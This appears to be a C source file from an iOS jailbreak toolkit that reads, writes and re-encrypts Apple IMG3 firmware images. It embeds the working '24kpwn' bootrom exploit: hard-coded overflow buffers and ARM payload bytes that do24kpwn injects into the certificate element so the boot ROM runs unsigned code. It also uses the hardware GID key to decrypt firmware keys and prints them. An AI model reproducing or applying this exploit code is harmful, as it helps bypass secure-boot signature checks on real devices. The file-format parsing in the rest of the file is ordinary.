#include <stdlib.h>
#include <string.h>
#include "common.h"
#include <xpwn/img3.h>
#include <xpwn/libxpwn.h>

static const uint8_t x24kpwn_overflow_data[] = {
  0x12, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x40, 0xac, 0x05, 0x81, 0x12,
  0x00, 0x00, 0x01, 0x02, 0x03, 0x01, 0x0a, 0x06, 0x00, 0x02, 0x00, 0x00,
  0x00, 0x40, 0x01, 0x00, 0x1c, 0x40, 0x02, 0x22, 0x1c, 0x40, 0x02, 0x22,
  0x04, 0x09, 0x00, 0x00, 0x2c, 0x40, 0x02, 0x22, 0x6b, 0x73, 0x61, 0x74,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x62, 0x6f, 0x6f, 0x74, 0x73, 0x74, 0x72, 0x61,
  0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x6b, 0x73, 0x74,
  0xc0, 0x40, 0x02, 0x22, 0xc0, 0x40, 0x02, 0x22, 0xc8, 0x40, 0x02, 0x22,
  0xc8, 0x40, 0x02, 0x22, 0x84, 0x53, 0x02, 0x22, 0x00, 0x00, 0x00, 0x38,
  0x04, 0x00, 0x00, 0x38, 0x08, 0x00, 0x00, 0x38, 0x0c, 0x00, 0x00, 0x38,
  0x10, 0x00, 0x00, 0x38, 0x20, 0x00, 0x00, 0x38, 0x24, 0x00, 0x00, 0x38,
  0x28, 0x00, 0x00, 0x38, 0x2c, 0x00, 0x00, 0x38, 0x30, 0x00, 0x00, 0x38,
  0x24, 0xfe, 0x02, 0x22
};

static const uint8_t x24kpwn_payload_data[] = {
  0x0d, 0x48, 0x0c, 0x49, 0x08, 0x60, 0x0a, 0x48, 0x08, 0x49, 0x08, 0x60,
  0x06, 0x48, 0x85, 0x46, 0x0e, 0xb0, 0x00, 0x20, 0x1c, 0xbc, 0x90, 0x46,
  0x9a, 0x46, 0xa3, 0x46, 0xf0, 0xbc, 0x02, 0xbc, 0x00, 0x20, 0x00, 0x25,
  0x05, 0x49, 0x08, 0x47, 0xd4, 0xfe, 0x02, 0x22, 0x20, 0x00, 0x00, 0x22,
  0xAA, 0xBB, 0xCC, 0xDD, 0xfc, 0x40, 0x02, 0x22, 0x40, 0x00, 0x00, 0x38,
  0xcf, 0x22, 0x00, 0x00
};

static const uint8_t n8824kpwn_overflow_data[] = {
	0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x06,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x20, 0x40, 0x02, 0x84,
	0x20, 0x40, 0x02, 0x84, 0x04, 0x09, 0x00, 0x00, 0x30, 0x40, 0x02, 0x84,
	0x6b, 0x73, 0x61, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0x6f, 0x6f, 0x74,
	0x73, 0x74, 0x72, 0x61, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x32, 0x6b, 0x73, 0x74, 0xc4, 0x40, 0x02, 0x84, 0xc4, 0x40, 0x02, 0x84,
	0xcc, 0x40, 0x02, 0x84, 0xcc, 0x40, 0x02, 0x84, 0x01, 0x00, 0x00, 0x00,
	0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
	0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x01, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x01, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x01, 0x07, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x01, 0x07, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x01, 0x01, 0x07, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x03, 0x00, 0x00, 0x00, 0x08, 0x10, 0x83, 0x00, 0x00, 0x10, 0x83,
	0x00, 0x00, 0x10, 0x80, 0x04, 0x00, 0x10, 0x80, 0x08, 0x00, 0x10, 0x80,
	0x0c, 0x00, 0x10, 0x80, 0x10, 0x00, 0x10, 0x80, 0x20, 0x00, 0x10, 0x80,
	0x24, 0x00, 0x10, 0x80, 0x28, 0x00, 0x10, 0x80, 0x2c, 0x00, 0x10, 0x80,
	0x30, 0x00, 0x10, 0x80, 0xf4, 0x3d, 0x03, 0x84
};

static const uint8_t n8824kpwn_payload_data[] = {
	0x09, 0x48, 0x0a, 0x49, 0x01, 0x60, 0x0a, 0x48, 0x0a, 0x49, 0x01, 0x60,
	0x0b, 0x48, 0x85, 0x46, 0x1c, 0xbc, 0x90, 0x46, 0x9a, 0x46, 0xa3, 0x46,
	0xf0, 0xbc, 0x01, 0xbc, 0x06, 0x48, 0x00, 0x21, 0x01, 0x60, 0x07, 0x48,
	0x00, 0x47, 0x00, 0x00, 0xcc, 0x41, 0x02, 0x84, 0x40, 0x00, 0x10, 0x80,
	0x40, 0x00, 0x00, 0x84, 0xAA, 0xBB, 0xCC, 0xDD, 0x30, 0x3f, 0x03, 0x84,
	0xfc, 0x3e, 0x03, 0x84, 0x73, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};



#ifdef HAVE_HW_CRYPTO
#include <stdint.h>
#include <IOKit/IOKitLib.h>

typedef struct 
{
	void*		inbuf;
	void*		outbuf;
	uint32_t	size;
	uint8_t		iv[16];
	uint32_t	mode;
	uint32_t	bits;
	uint8_t		keybuf[32];
	uint32_t	mask;
} IOAESStruct;

#define kIOAESAcceleratorInfo 0
#define kIOAESAcceleratorTask 1
#define kIOAESAcceleratorTest 2

#define kIOAESAcceleratorEncrypt 0
#define kIOAESAcceleratorDecrypt 1

#define kIOAESAcceleratorGIDMask 0x3E8
#define kIOAESAcceleratorUIDMask 0x7D0
#define kIOAESAcceleratorCustomMask 0

typedef enum {
	UID,
	GID,
	Custom
} IOAESKeyType;

IOReturn doAES(io_connect_t conn, void* inbuf, void *outbuf, uint32_t size, IOAESKeyType keyType, void* key, void* iv, int mode) {
	IOAESStruct in;

	in.mode = mode;
	in.bits = 128;
	in.inbuf = inbuf;
	in.outbuf = outbuf;
	in.size = size;

	switch(keyType) {
		case UID:
			in.mask = kIOAESAcceleratorUIDMask;
			break;
		case GID:
			in.mask = kIOAESAcceleratorGIDMask;
			break;
		case Custom:
			in.mask = kIOAESAcceleratorCustomMask;
			break;
	}
	memset(in.keybuf, 0, sizeof(in.keybuf));

	if(key)
		memcpy(in.keybuf, key, in.bits / 8);

	if(iv)
		memcpy(in.iv, iv, 16);
	else
		memset(in.iv, 0, 16);

	IOByteCount inSize = sizeof(in);

	return IOConnectCallStructMethod(conn, kIOAESAcceleratorTask, &in, inSize, &in, &inSize);
}

#endif

void writeImg3Element(AbstractFile* file, Img3Element* element, Img3Info* info);

void writeImg3Root(AbstractFile* file, Img3Element* element, Img3Info* info);

void flipAppleImg3Header(AppleImg3Header* header) {
	FLIPENDIANLE(header->magic);
	FLIPENDIANLE(header->size);
	FLIPENDIANLE(header->dataSize);
}

void flipAppleImg3RootExtra(AppleImg3RootExtra* extra) {
	FLIPENDIANLE(extra->shshOffset);
	FLIPENDIANLE(extra->name);
}

flipAppleImg3KBAGHeader(AppleImg3KBAGHeader* data) {
	FLIPENDIANLE(data->key_modifier);
	FLIPENDIANLE(data->key_bits);
}

size_t readImg3(AbstractFile* file, void* data, size_t len) {
	Img3Info* info = (Img3Info*) file->data;
	memcpy(data, (void*)((uint8_t*)info->data->data + (uint32_t)info->offset), len);
	info->offset += (size_t)len;
	return len;
}

size_t writeImg3(AbstractFile* file, const void* data, size_t len) {
	Img3Info* info = (Img3Info*) file->data;

	while((info->offset + (size_t)len) > info->data->header->dataSize) {
		info->data->header->dataSize = info->offset + (size_t)len;
		info->data->header->size = (((info->data->header->dataSize + 16) / 16) * 16) + sizeof(AppleImg3Header);
		if(info->data->header->size % 0x4 != 0) {
			info->data->header->size += 0x4 - (info->data->header->size % 0x4);
		}
		info->data->data = realloc(info->data->data, info->data->header->dataSize);
	}
	
	memcpy((void*)((uint8_t*)info->data->data + (uint32_t)info->offset), data, len);
	info->offset += (size_t)len;
	
	info->dirty = TRUE;
	
	return len;
}

int seekImg3(AbstractFile* file, off_t offset) {
	Img3Info* info = (Img3Info*) file->data;
	info->offset = (size_t)offset;
	return 0;
}

off_t tellImg3(AbstractFile* file) {
	Img3Info* info = (Img3Info*) file->data;
	return (off_t)info->offset;
}

off_t getLengthImg3(AbstractFile* file) {
	Img3Info* info = (Img3Info*) file->data;
	return info->data->header->dataSize;
}

void closeImg3(AbstractFile* file) {
	Img3Info* info = (Img3Info*) file->data;

	if(info->dirty) {
		if(info->encrypted) {
			uint8_t ivec[16];
			memcpy(ivec, info->iv, 16);
			AES_cbc_encrypt(info->data->data, info->data->data, (info->data->header->dataSize / 16) * 16, &(info->encryptKey), ivec, AES_ENCRYPT);
		}

		if(info->exploit24k) {
			info->replaceDWord = *((uint32_t*) info->data->data);
			FLIPENDIANLE(info->replaceDWord);
			*((uint32_t*) info->data->data) = 0x22023001;
			flipEndianLE(info->data->data, 4);
		}

		if(info->exploitN8824k) {
			info->replaceDWord = *((uint32_t*) info->data->data);
			FLIPENDIANLE(info->replaceDWord);
			*((uint32_t*) info->data->data) = 0x84023001;
			flipEndianLE(info->data->data, 4);
		}

		info->file->seek(info->file, 0);
		info->root->header->dataSize = 0;	/* hack to make certain writeImg3Element doesn't preallocate */
		info->root->header->size = 0;
		writeImg3Element(info->file, info->root, info);
	}

	info->root->free(info->root);
	info->file->close(info->file);
	free(info);
	free(file);
}

void setKeyImg3(AbstractFile2* file, const unsigned int* key, const unsigned int* iv) {
	Img3Info* info = (Img3Info*) file->super.data;

	int i;
	uint8_t bKey[32];
	int keyBits = ((AppleImg3KBAGHeader*)info->kbag->data)->key_bits;

	for(i = 0; i < 16; i++) {
		info->iv[i] = iv[i] & 0xff;
	}

	for(i = 0; i < (keyBits / 8); i++) {
		bKey[i] = key[i] & 0xff;
	}

	AES_set_encrypt_key(bKey, keyBits, &(info->encryptKey));
	AES_set_decrypt_key(bKey, keyBits, &(info->decryptKey));

	if(!info->encrypted) {
		uint8_t ivec[16];
		memcpy(ivec, info->iv, 16);
                AES_cbc_encrypt(info->data->data, info->data->data, ((info->data->header->size - sizeof(AppleImg3Header)) / 16) * 16, &(info->decryptKey), ivec, AES_DECRYPT);
	}

	info->encrypted = TRUE;
}

Img3Element* readImg3Element(AbstractFile* file);

void freeImg3Default(Img3Element* element) {
	free(element->header);
	free(element->data);
	free(element);
}

void freeImg3Root(Img3Element* element) {
	Img3Element* current;
	Img3Element* toFree;

	free(element->header);

	current = (Img3Element*)(element->data);

	while(current != NULL) {
		toFree = current;
		current = current->next;
		toFree->free(toFree);
	}

	free(element);
}

void readImg3Root(AbstractFile* file, Img3Element* element) {
	Img3Element* children;
	Img3Element* current;
	uint32_t remaining;
	AppleImg3RootHeader* header;

	children = NULL;

	header = (AppleImg3RootHeader*) realloc(element->header, sizeof(AppleImg3RootHeader));
	element->header = (AppleImg3Header*) header;

	file->read(file, &(header->extra), sizeof(AppleImg3RootExtra));
	flipAppleImg3RootExtra(&(header->extra));

	remaining = header->base.dataSize;

	while(remaining > 0) {
		if(children != NULL) {
			current->next = readImg3Element(file);
			current = current->next;
		} else {
			current = readImg3Element(file);
			children = current;
		}
		remaining -= current->header->size;
	}

	element->data = (void*) children;
	element->write = writeImg3Root;
	element->free = freeImg3Root;
}

void writeImg3Root(AbstractFile* file, Img3Element* element, Img3Info* info) {
	AppleImg3RootHeader* header;
	Img3Element* current;
	off_t curPos;

	curPos = file->tell(file);
	curPos -= sizeof(AppleImg3Header);

	file->seek(file, curPos + sizeof(AppleImg3RootHeader));

	header = (AppleImg3RootHeader*) element->header;

	current = (Img3Element*) element->data;
	while(current != NULL) {
		if(current->header->magic == IMG3_SHSH_MAGIC) {
			header->extra.shshOffset = (uint32_t)(file->tell(file) - sizeof(AppleImg3RootHeader));
		}

		if(current->header->magic != IMG3_KBAG_MAGIC || info->encrypted)
		{
			writeImg3Element(file, current, info);
		}

		current = current->next;
	}

	header->base.dataSize = file->tell(file) - (curPos + sizeof(AppleImg3RootHeader));
	header->base.size = sizeof(AppleImg3RootHeader) + header->base.dataSize;

	file->seek(file, curPos);

	flipAppleImg3Header(&(header->base));
	flipAppleImg3RootExtra(&(header->extra));
	file->write(file, header, sizeof(AppleImg3RootHeader));
	flipAppleImg3RootExtra(&(header->extra));
	flipAppleImg3Header(&(header->base));

	file->seek(file, header->base.size);
}

void writeImg3Default(AbstractFile* file, Img3Element* element, Img3Info* info) {
        const char zeros[0x10] = {0};
	file->write(file, element->data, element->header->dataSize);
	if((element->header->size - sizeof(AppleImg3Header)) > element->header->dataSize) {
		file->write(file, zeros, (element->header->size - sizeof(AppleImg3Header)) - element->header->dataSize);
	}
}

void writeImg3KBAG(AbstractFile* file, Img3Element* element, Img3Info* info) {
	flipAppleImg3KBAGHeader((AppleImg3KBAGHeader*) element->data);
	writeImg3Default(file, element, info);
	flipAppleImg3KBAGHeader((AppleImg3KBAGHeader*) element->data);
}

void do24kpwn(Img3Info* info, Img3Element* element, off_t curPos, const uint8_t* overflow, size_t overflow_size, const uint8_t* payload, size_t payload_size)
{
	off_t sizeRequired = (0x24000 + overflow_size) - curPos;
	off_t dataRequired = sizeRequired - sizeof(AppleImg3Header);
	element->data = realloc(element->data, dataRequired);
	memset(((uint8_t*)element->data) + element->header->dataSize, 0, dataRequired - element->header->dataSize);
	uint32_t overflowOffset = 0x24000 - (curPos + sizeof(AppleImg3Header));
	uint32_t payloadOffset = 0x23000 - (curPos + sizeof(AppleImg3Header));

	memcpy(((uint8_t*)element->data) + overflowOffset, overflow, overflow_size);
	memcpy(((uint8_t*)element->data) + payloadOffset, payload, payload_size);

	uint32_t* i;
	for(i = (uint32_t*)(((uint8_t*)element->data) + payloadOffset);
			i < (uint32_t*)(((uint8_t*)element->data) + payloadOffset + payload_size);
			i++) {
		uint32_t candidate = *i;
		FLIPENDIANLE(candidate);
		if(candidate == 0xDDCCBBAA) {
			candidate = info->replaceDWord;
			FLIPENDIANLE(candidate);
			*i = candidate;
			break;
		}
	}

	element->header->size = sizeRequired;
	element->header->dataSize = dataRequired;
}

void writeImg3Element(AbstractFile* file, Img3Element* element, Img3Info* info) {
	off_t curPos;

	if(info->exploit24k && element->header->magic == IMG3_TYPE_MAGIC) {
		// Drop TYPE tag for exploited LLB, because it throws off our payload calculations
		// Bootrom shouldn't care anyway, and kernel currently doesn't care
		return;
	}

	curPos = file->tell(file);

	if(element->header->magic == IMG3_CERT_MAGIC) {
		if(info->exploit24k) {
			do24kpwn(info, element, curPos, x24kpwn_overflow_data, sizeof(x24kpwn_overflow_data), x24kpwn_payload_data, sizeof(x24kpwn_payload_data));
		} else if(info->exploitN8824k) {
			do24kpwn(info, element, curPos, n8824kpwn_overflow_data, sizeof(n8824kpwn_overflow_data), n8824kpwn_payload_data, sizeof(n8824kpwn_payload_data));
		}
	}

	flipAppleImg3Header(element->header);
	file->write(file, element->header, sizeof(AppleImg3Header));
	flipAppleImg3Header(element->header);

	element->write(file, element, info);

	file->seek(file, curPos + element->header->size);
}

Img3Element* readImg3Element(AbstractFile* file) {
	Img3Element* toReturn;
	AppleImg3Header* header;
	off_t curPos;

	curPos = file->tell(file);

	header = (AppleImg3Header*) malloc(sizeof(AppleImg3Header));
	file->read(file, header, sizeof(AppleImg3Header));
	flipAppleImg3Header(header);

	toReturn = (Img3Element*) malloc(sizeof(Img3Element));
	toReturn->header = header;
	toReturn->next = NULL;

	switch(header->magic) {
		case IMG3_MAGIC:
			readImg3Root(file, toReturn);
			break;

		case IMG3_KBAG_MAGIC:
			toReturn->data = (unsigned char*) malloc(header->dataSize);
			toReturn->write = writeImg3KBAG;
			toReturn->free = freeImg3Default;
			file->read(file, toReturn->data, header->dataSize);
			flipAppleImg3KBAGHeader((AppleImg3KBAGHeader*) toReturn->data);
			break;

		default:
			toReturn->data = (unsigned char*) malloc(header->dataSize);
			toReturn->write = writeImg3Default;
			toReturn->free = freeImg3Default;
			file->read(file, toReturn->data, header->dataSize);
	}

	file->seek(file, curPos + toReturn->header->size);

	return toReturn;
}

AbstractFile* createAbstractFileFromImg3(AbstractFile* file) {
	AbstractFile* toReturn;
	Img3Info* info;
	Img3Element* current;

	if(!file) {
		return NULL;
	}

	file->seek(file, 0);

	info = (Img3Info*) malloc(sizeof(Img3Info));
	info->file = file;
	info->root = readImg3Element(file);

	info->data = NULL;
	info->cert = NULL;
	info->kbag = NULL;
	info->type = NULL;
	info->encrypted = FALSE;

	current = (Img3Element*) info->root->data;
	while(current != NULL) {
		if(current->header->magic == IMG3_DATA_MAGIC) {
			info->data = current;
		}
		if(current->header->magic == IMG3_CERT_MAGIC) {
			info->cert = current;
		}
		if(current->header->magic == IMG3_TYPE_MAGIC) {
			info->type = current;
		}
		if(current->header->magic == IMG3_KBAG_MAGIC && ((AppleImg3KBAGHeader*)current->data)->key_modifier == 1) {
			info->kbag = current;
		}
		current = current->next;
	}

	info->offset = 0;
	info->dirty = FALSE;
	info->exploit24k = FALSE;
	info->exploitN8824k = FALSE;
	info->encrypted = FALSE;

	toReturn = (AbstractFile*) malloc(sizeof(AbstractFile2));
	toReturn->data = info;
	toReturn->read = readImg3;
	toReturn->write = writeImg3;
	toReturn->seek = seekImg3;
	toReturn->tell = tellImg3;
	toReturn->getLength = getLengthImg3;
	toReturn->close = closeImg3;
	toReturn->type = AbstractFileTypeImg3;

	AbstractFile2* abstractFile2 = (AbstractFile2*) toReturn;
	abstractFile2->setKey = setKeyImg3;

	if(info->kbag) {
		uint8_t* keySeed;
		uint32_t keySeedLen;
		keySeedLen = 16 + (((AppleImg3KBAGHeader*)info->kbag->data)->key_bits)/8;
		keySeed = (uint8_t*) malloc(keySeedLen);
		memcpy(keySeed, (uint8_t*)((AppleImg3KBAGHeader*)info->kbag->data) + sizeof(AppleImg3KBAGHeader), keySeedLen);
#ifdef HAVE_HW_CRYPTO
		printf("Have hardware crypto\n");
		CFMutableDictionaryRef dict = IOServiceMatching("IOAESAccelerator");
		io_service_t dev = IOServiceGetMatchingService(kIOMasterPortDefault, dict);
		io_connect_t conn = 0;
		IOServiceOpen(dev, mach_task_self(), 0, &conn);

		int i;
		printf("KeySeed: ");
		for(i = 0; i < keySeedLen; i++)
		{
			printf("%02x", keySeed[i]);
		}
		printf("\n");

		if(doAES(conn, keySeed, keySeed, keySeedLen, GID, NULL, NULL, kIOAESAcceleratorDecrypt) == 0) {
			unsigned int key[keySeedLen - 16];
			unsigned int iv[16];

			printf("IV: ");
			for(i = 0; i < 16; i++)
			{
				iv[i] = keySeed[i];
				printf("%02x", iv[i]);
			}
			printf("\n");

			printf("Key: ");
			for(i = 0; i < (keySeedLen - 16); i++)
			{
				key[i] = keySeed[i + 16];
				printf("%02x", key[i]);
			}
			printf("\n");

			setKeyImg3(abstractFile2, key, iv);
		}

		IOServiceClose(conn);
		IOObjectRelease(dev);
#else
		int i = 0;
		char outputBuffer[256];
		char curBuffer[256];
		outputBuffer[0] = '\0';
		for(i = 0; i < keySeedLen; i++) {
			sprintf(curBuffer, "%02x", keySeed[i]);
			strcat(outputBuffer, curBuffer);
		}
		strcat(outputBuffer, "\n");
		XLOG(4, outputBuffer);
#endif
		free(keySeed);
	}

	return toReturn;
}

void replaceCertificateImg3(AbstractFile* file, AbstractFile* certificate) {
	Img3Info* info = (Img3Info*) file->data;

	info->cert->header->dataSize = certificate->getLength(certificate);
	info->cert->header->size = info->cert->header->dataSize + sizeof(AppleImg3Header);
	if(info->cert->data != NULL) {
		free(info->cert->data);
	}
	info->cert->data = malloc(info->cert->header->dataSize);
	certificate->read(certificate, info->cert->data, info->cert->header->dataSize);

	info->dirty = TRUE;
}

AbstractFile* duplicateImg3File(AbstractFile* file, AbstractFile* backing) {
	Img3Info* info;
	AbstractFile* toReturn;

	if(!file) {
		return NULL;
	}

	toReturn = createAbstractFileFromImg3(((Img3Info*)file->data)->file);
	info = (Img3Info*)toReturn->data;

	info->file = backing;
	info->offset = 0;
	info->dirty = TRUE;
	info->data->header->dataSize = 0;
	info->data->header->size = info->data->header->dataSize + sizeof(AppleImg3Header);

	return toReturn;
}

void exploit24kpwn(AbstractFile* file) {
	Img3Info* info = (Img3Info*) file->data;
	info->exploit24k = TRUE;
	info->dirty = TRUE;
}

void exploitN8824kpwn(AbstractFile* file) {
	Img3Info* info = (Img3Info*) file->data;
	info->exploitN8824k = TRUE;
	info->dirty = TRUE;
}
